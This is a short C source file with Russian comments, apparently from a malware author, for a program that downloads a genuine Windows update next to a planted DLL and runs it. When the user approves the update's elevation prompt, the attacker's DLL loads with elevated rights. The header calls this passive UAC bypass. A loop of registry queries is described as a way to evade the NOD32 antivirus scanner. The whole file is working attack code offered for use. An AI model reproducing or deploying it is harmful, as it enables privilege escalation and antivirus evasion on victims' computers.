/***************************************************************************************************************\
*																												*
*											avsux.exe															*
*																												*
* avsux.exe работает в паре с feclient.dll (нашей длл);															*
* Значит, вначале кладём данную прогу и нашу длл в одну папку. Затем запускаем эту прогу.						*
* Она создаст директорию C:\xlogs, закачает определённый апдейт (в ту же папку, где прога с длл) винды и		*
* запустит его. Апдейт попросит повышение привилегий, и если юзер одобрит - то наша длл будет пахать тоже на	*
* повышенных привилегиях. Это одна из фич пассивного обхода uac;												* 
*																												*
\***************************************************************************************************************/

																							//m1x
																							//pr0mix@mail.ru
																							//EOF



#include <windows.h>
#include <urlmon.h>



#pragma comment(lib, "urlmon.lib")	//подключаем статически данную либу; 



//наша главная функа WinMain; 
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char szFileName[MAX_PATH];
	HRESULT res; 
	char szDirName[] = "C:\\xlogs";
	int i = 0; 
	HKEY hKey; 
	LPSTR *pPart;

	for(i = 0; i< 15000; i++)	//эта фича нужна для обхода сканера нод32; 
	{
		if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "eba!", 0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
		{
			MessageBoxA(0, "eba!", "eba!", MB_OK);
		}
	}

	GetModuleFileNameA(0, szFileName, MAX_PATH);	//получаем полный путь к avsux.exe; 
	GetFullPathNameA(szFileName, MAX_PATH, szFileName, &pPart);	//pPart - указывает на имя avsux.exe; 
	pPart[0] = 0;	//обнуляем имя - получаем просто полный путь (без имени - ёба); 
	CreateDirectoryA(szDirName, 0);	//создаём директорию для нашей длл (она там создаст лог и будет в него писать); 
	strcat(szFileName, "Windows-KB243657.exe");	//добавляем имя для будущего скаченного апдейта винды; 
	res = URLDownloadToFileA(0, "http://download.microsoft.com/download/B/0/0/B00DF5E6-9A8F-403C-AB57-AED66C7E5BEE/WindowsXP-KB2393802-x86-ENU.exe", szFileName, 0, 0);	//скачиваем файл; 

	if (res == S_OK)
	{
		ShellExecuteA(NULL, "open", szFileName, NULL, NULL, SW_SHOW);	//если всё оке, тогда запустим этот файл; 
	}

	return 0;
}
